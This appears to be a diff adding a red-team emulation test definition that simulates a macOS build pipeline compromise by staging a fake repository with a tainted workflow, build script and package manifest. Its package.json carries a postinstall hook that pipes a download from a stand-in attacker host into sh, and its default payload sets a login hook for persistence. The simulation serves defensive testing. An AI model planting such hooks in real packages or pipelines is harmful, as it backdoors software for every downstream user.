@@ -1,0 +1,118 @@
+api_version: 2.0
+id: 550e8400-e29b-41d4-a716-446655440025
+platform: darwin
+name: Build pipeline compromise
+category: Initial Access
+description: Simulate compromise of software build pipeline. Attacker injects malware into build scripts or CI/CD configuration to poison all compiled artifacts.
+tactics:
+  - T1195.001
+techniques:
+  - T1195.001
+args:
+  - name: package_name
+    description: Name of the project in build pipeline
+    type: string
+    default: myapp
+  - name: version
+    description: Version being built
+    type: string
+    default: "2.0.0"
+  - name: source_repo
+    description: Repository with compromised build pipeline
+    type: string
+    default: "https://github.com/company/myapp"
+  - name: backdoor_payload
+    description: Malware to inject into build output
+    type: string
+    default: "defaults write com.apple.loginwindow LoginHook /tmp/.hidden_daemon"
+steps:
+  - name: Create fake repository structure
+    command: mkdir -p /tmp/ttpforge_build/{{ package_name }}/.github/workflows
+    
+  - name: Create malicious GitHub Actions workflow
+    command: |
+      cat > /tmp/ttpforge_build/{{ package_name }}/.github/workflows/build.yml << 'WORKFLOW'
+      name: Build and Release
+      on:
+        push:
+          tags:
+            - 'v*'
+      jobs:
+        build:
+          runs-on: macos-latest
+          steps:
+            - uses: actions/checkout@v2
+            - name: Build application
+              run: |
+                ./build.sh
+            - name: Inject malicious code
+              run: |
+                echo '{{ backdoor_payload }}' >> src/main.swift
+            - name: Release
+              run: ./release.sh
+      WORKFLOW
+    
+  - name: Create compromised build script
+    command: |
+      cat > /tmp/ttpforge_build/{{ package_name }}/build.sh << 'BUILDSH'
+      #!/bin/bash
+      echo "Building {{ package_name }} version {{ version }}..."
+      mkdir -p build
+      
+      # Inject payload into binary
+      cat > build/inject_payload.sh << 'PAYLOAD'
+      #!/bin/bash
+      echo "{{ backdoor_payload }}" > /tmp/.build_payload
+      touch /tmp/.build_infected
+      PAYLOAD
+      
+      chmod +x build/inject_payload.sh
+      bash build/inject_payload.sh
+      echo "Build complete"
+      BUILDSH
+      chmod +x /tmp/ttpforge_build/{{ package_name }}/build.sh
+    
+  - name: Create package manifest with backdoor
+    command: |
+      cat > /tmp/ttpforge_build/{{ package_name }}/package.json << 'MANIFEST'
+      {
+        "name": "{{ package_name }}",
+        "version": "{{ version }}",
+        "description": "Legitimate application",
+        "scripts": {
+          "build": "bash build.sh",
+          "postinstall": "curl -s http://attacker.com/setup | sh"
+        }
+      }
+      MANIFEST
+    
+  - name: Execute compromised build
+    command: bash /tmp/ttpforge_build/{{ package_name }}/build.sh
+    dry_run: true
+
+checks:
+  - name: Verify build pipeline created
+    command: test -f /tmp/ttpforge_build/{{ package_name }}/build.sh
+    expected_output: ""
+    
+  - name: Verify workflow file exists
+    command: test -f /tmp/ttpforge_build/{{ package_name }}/.github/workflows/build.yml
+    expected_output: ""
+    
+  - name: Verify build infection marker
+    command: test -f /tmp/.build_infected
+    expected_output: ""
+    
+  - name: Verify malicious package manifest
+    command: test -f /tmp/ttpforge_build/{{ package_name }}/package.json
+    expected_output: ""
+
+tests:
+  dry_run: true
+
+cleanup:
+  - name: Remove compromised build repository
+    command: rm -rf /tmp/ttpforge_build/{{ package_name }}
+    
+  - name: Remove build infection markers
+    command: rm -f /tmp/.build_infected /tmp/.build_payload
